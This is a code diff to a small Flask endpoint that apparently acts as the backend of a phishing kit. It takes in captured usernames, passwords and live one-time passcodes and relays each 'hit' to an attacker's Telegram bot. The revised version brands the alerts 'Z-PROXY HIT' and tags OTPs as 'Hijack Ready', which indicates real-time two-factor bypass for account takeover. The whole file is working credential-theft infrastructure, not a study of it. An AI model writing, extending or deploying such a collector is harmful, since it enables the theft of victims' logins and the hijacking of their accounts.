@@ -4,30 +4,30 @@ import os
 
 app = Flask(__name__)
 
-# Vercel Environment Variables se data lena
-BOT_TOKEN = os.environ.get('BOT_TOKEN')
+# Environment Variables
+TOKEN = os.environ.get('BOT_TOKEN')
 CHAT_ID = os.environ.get('CHAT_ID')
 
 @app.route('/api', methods=['POST'])
-def handle_data():
-    data = request.json
-    data_type = data.get('type')
-    user = data.get('user')
-    
-    msg = f"🚀 **New Hit Detected!**\n👤 User: `{user}`\n"
-    
-    if data_type == 'LOG' or data_type == 'VERIFIED':
-        msg += f"🔑 Pass: `{data.get('pass')}`\n📊 Status: {data_type}"
-    elif data_type == 'OTP':
-        msg += f"🔢 OTP: `{data.get('otp')}`\n✅ Status: Live Capture"
+def middleman():
+    try:
+        data = request.get_json(force=True)
+        user = data.get('u')
+        dtype = data.get('type')
+        
+        msg = f"🥷 **Z-PROXY HIT**\n\n👤 User: `{user}`\n"
+        
+        if dtype == 'OTP_LIVE':
+            msg += f"🔢 **LIVE OTP:** `{data.get('o')}`\n🔥 Status: Hijack Ready"
+        else:
+            msg += f"🔑 **Pass:** `{data.get('p')}`\n📊 **Attempt:** {dtype}"
 
-    # Telegram API Call
-    tel_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    requests.post(tel_url, json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
-    
-    return jsonify({"status": "ok"})
+        # Telegram Call
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
+        return jsonify({"status": "received"})
+    except:
+        return jsonify({"status": "error"}), 500
 
-# Vercel requirement
-def handler(event, context):
-    return app(event, context)
+def handler(req, res):
+    return app(req, res)
     
